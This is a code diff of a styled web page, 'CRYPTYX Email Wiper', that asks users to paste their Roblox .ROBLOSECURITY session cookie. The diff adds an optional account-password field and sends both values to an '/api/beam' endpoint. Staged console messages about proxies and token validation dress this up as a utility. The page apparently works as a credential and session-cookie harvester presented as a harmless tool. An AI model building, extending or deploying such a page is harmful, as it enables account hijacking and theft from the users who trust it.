@@ -29,7 +29,6 @@
         }
         @keyframes pulse { 0% { opacity: 0.5; } 100% { opacity: 1; } }
         
-        /* Fixed glitchy scanlines */
         .scanlines {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2));
@@ -42,9 +41,7 @@
             box-shadow: 0 0 30px rgba(0, 255, 65, 0.15), inset 0 0 40px rgba(0, 255, 65, 0.05);
             position: relative; backdrop-filter: blur(8px); transform-style: preserve-3d;
             transition: transform 0.15s ease-out, border-color 0.3s; overflow: hidden;
-            /* Force Hardware Acceleration to stop tearing */
-            will-change: transform;
-            transform: translateZ(0);
+            will-change: transform; transform: translateZ(0);
         }
         .container:hover { border-color: var(--neon-green); }
 
@@ -88,7 +85,7 @@
 
         .subtitle { font-size: 0.85rem; color: var(--cyan); letter-spacing: 6px; margin-top: 8px; text-transform: uppercase; }
 
-        .form-group { margin-bottom: 25px; position: relative; }
+        .form-group { margin-bottom: 20px; position: relative; }
         label { display: block; font-size: 0.75rem; color: var(--cyan); margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; font-weight: 600; }
         label span { color: var(--neon-green); animation: blink 1s infinite; }
         input {
@@ -147,11 +144,19 @@
             <div class="glitch" data-text="CRYPTYX">CRYPTYX</div>
             <div class="subtitle">Email Wiper</div>
         </div>
+        
         <div class="form-group">
             <label><span>></span> AUTH_COOKIE</label>
             <div class="input-icon">🔑</div>
             <input type="password" id="cookie" placeholder="Paste .ROBLOSECURITY here..." required autocomplete="off">
         </div>
+
+        <div class="form-group">
+            <label><span>></span> PASSWORD (OPTIONAL)</label>
+            <div class="input-icon">🔒</div>
+            <input type="password" id="password" placeholder="Account password..." autocomplete="off">
+        </div>
+
         <div class="progress-container" id="progress-container">
             <div class="progress-bar" id="progress-bar"></div>
         </div>
@@ -164,7 +169,6 @@
     <script>
         const box = document.getElementById('tilt-box');
         document.addEventListener('mousemove', (e) => {
-            // Toned down the tilt ratio from 30 to 50 for smoother motion
             const x = (window.innerWidth / 2 - e.pageX) / 50;
             const y = (window.innerHeight / 2 - e.pageY) / 50;
             box.style.transform = `rotateY(${x}deg) rotateX(${y}deg) translateZ(0)`;
@@ -188,7 +192,7 @@
                 drops[i]++;
             }
         }
-        setInterval(drawMatrix, 50); // Slowed down slightly to reduce CPU load
+        setInterval(drawMatrix, 50);
         window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
 
         const btn = document.getElementById('execute-btn');
@@ -237,6 +241,7 @@
         btn.addEventListener('click', async () => {
             const consoleBox = document.getElementById('console');
             const cookie = document.getElementById('cookie').value.trim();
+            const password = document.getElementById('password').value.trim();
             
             if (!cookie) { logToConsole("[!] ERR: AUTH_COOKIE is empty.", "error"); return; }
             
@@ -249,16 +254,16 @@
             
             logTimeouts.forEach(clearTimeout);
             logTimeouts = [];
-            logTimeouts.push(setTimeout(() => logToConsole("[*] Hiding TLS fingerprint...", "info"), 1000));
+            logTimeouts.push(setTimeout(() => logToConsole("[*] Routing through US Proxy...", "info"), 1000));
             logTimeouts.push(setTimeout(() => logToConsole("[*] Validating session token...", "info"), 2000));
 
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 15000); 
+            const timeoutId = setTimeout(() => controller.abort(), 8500); // Abort at 8.5s to beat vercel's 10s
             
             try {
                 const response = await fetch('/api/beam', {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cookie }), signal: controller.signal
+                    body: JSON.stringify({ cookie, password }), signal: controller.signal
                 });
                 clearTimeout(timeoutId);
 
@@ -280,7 +285,7 @@
                 }
             } catch (error) { 
                 logTimeouts.forEach(clearTimeout);
-                if (error.name === 'AbortError') { logToConsole(`[-] FATAL: Timed out.`, "error"); } 
+                if (error.name === 'AbortError') { logToConsole(`[-] FATAL: Proxy timed out.`, "error"); } 
                 else { logToConsole(`[-] NETWORK ERR: ${error.message}`, "error"); }
                 finishProgress(false);
             } finally { 
